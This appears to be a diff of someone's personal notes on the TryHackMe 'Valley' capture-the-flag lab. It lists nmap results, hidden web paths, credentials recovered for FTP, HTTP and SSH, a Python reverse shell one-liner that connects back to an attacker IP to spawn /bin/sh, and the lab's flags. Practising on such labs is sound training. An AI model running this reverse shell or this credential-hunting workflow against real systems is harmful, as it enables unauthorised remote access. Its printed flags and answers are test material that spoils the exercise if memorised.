@@ -1,0 +1,68 @@
+THM - Valley
+Date - 25th August 2025
+Target IP - 10.201.59.195
+
+OPEN PORTS :- nmap
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 c2:84:2a:c1:22:5a:10:f1:66:16:dd:a0:f6:04:62:95 (RSA)
+|   256 42:9e:2f:f6:3e:5a:db:51:99:62:71:c4:8c:22:3e:bb (ECDSA)
+|_  256 2e:a0:a5:6c:d9:83:e0:01:6c:b9:8a:60:9b:63:86:72 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+
+Accessibilty :-
+
+| http://10.201.59.195/index.html
+| http://10.201.59.195/gallery/gallery.html
+| http://10.201.59.195/pricing/
+	- note.txt
+	- pricing.html
+| http://10.201.59.195/static/
+	- /00 ---> dev notes found
+	- /1
+	- /2
+	- /3
+	- /5
+	- /6
+	- /7
+	- /8
+	- /9
+	- /10
+	- /11
+	- /12
+	- /13
+	- /14
+	- /15
+	- /16
+	- /17
+	- /18
+| http://10.201.59.195/dev1243224123123/ ---> Hidden login page
+	- devnotes37370.txt
+
+Credentials :-
+|Hidden Login Page - FTP login PORT --> 37370
+	- username --> siemDev
+	- password --> california
+	
+|Wireshark :- http.response.method == POST
+	- username --> valleyDev
+	- password --> ph0t0s1234
+	
+|SSH LOGIN :-
+	- username --> valley
+	- password --> liberty123
+	
+FOUND :-
+	siemFTP.pcapng    |
+	siemHTTP1.pcapng  |----> All found in FTP Login
+	siemHTTP2.pcapng  |
+	
+Reverse Shell Command:-
+import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.17.25.212",7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")
+
+FLAGS FOUND :-
+| user.txt --> THM{k@l1_1n_th3_v@lley}
+| root.txt --> THM{v@lley_0f_th3_sh@d0w_0f_pr1v3sc}
